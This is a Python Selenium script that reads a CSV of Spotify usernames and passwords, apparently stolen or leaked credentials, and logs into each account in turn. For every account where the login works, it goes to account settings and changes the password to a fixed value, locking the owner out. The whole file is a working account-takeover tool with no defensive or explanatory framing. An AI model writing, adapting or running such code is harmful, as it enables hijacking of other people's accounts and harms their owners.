from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from models import Credential
import time
import random
import colorama
from colorama import Fore, Style
import csv

colorama.init()
creds = Credential.from_csv(file_name="spotify-good.csv")
firefox_binary = FirefoxBinary('C:\\Users\\abdul\\AppData\\Local\\Mozilla Firefox\\firefox.exe')
counter = 0
success = []
driver = webdriver.Firefox(firefox_binary=firefox_binary)
driver.get("https://accounts.spotify.com/en/login/")

for x in range(len(creds)):
    time.sleep(2)
    print(f"Trying email:{creds[counter].uname} password:{creds[counter].passwd}")


    email_field = driver.find_element_by_id("login-username")
    email_field.clear()
    email_field.send_keys(creds[counter].uname)
    

    password_field = driver.find_element_by_id("login-password")
    password_field.clear()
    password_field.send_keys(creds[counter].passwd)

    submit_button = driver.find_elements_by_id("login-button")
    submit_button[0].click()
    
    time.sleep(3)
    try:
        settings = driver.find_element_by_xpath("//*[@id='account-settings-link']")
        settings.click()
    except Exception:
        counter += 1
        continue
    time.sleep(5)

    try:
        toc = driver.find_element_by_xpath("/html/body/div[2]/div[3]/div/div/div[2]/button")
        toc.click()
        time.sleep(1)
    except Exception:
        pass
    cap = driver.find_element_by_xpath("/html/body/div[1]/div[4]/div/div[2]/div[2]/div[1]/div/ul/li[3]/a")
    cap.click()

    time.sleep(1)

    old_password = driver.find_element_by_id("old_password")
    old_password.clear()
    old_password.send_keys(creds[counter].passwd)
    print(creds[counter].passwd)

    new_password = driver.find_element_by_id("new_password")
    new_password.clear()
    new_password.send_keys("Pakistan47")

    new_password_confirmation = driver.find_element_by_id("new_password_confirmation")
    new_password_confirmation.clear()
    new_password_confirmation.send_keys("Pakistan47")      

    submit = driver.find_element_by_xpath("/html/body/div[1]/div[4]/div/div[2]/div[2]/div[2]/div/article/section/form/div[4]/button")
    submit.click()
    counter+=1
    time.sleep(1)

    driver.get("https://www.spotify.com/in/logout/")
    driver.get("https://accounts.spotify.com/en/login/")

driver.close()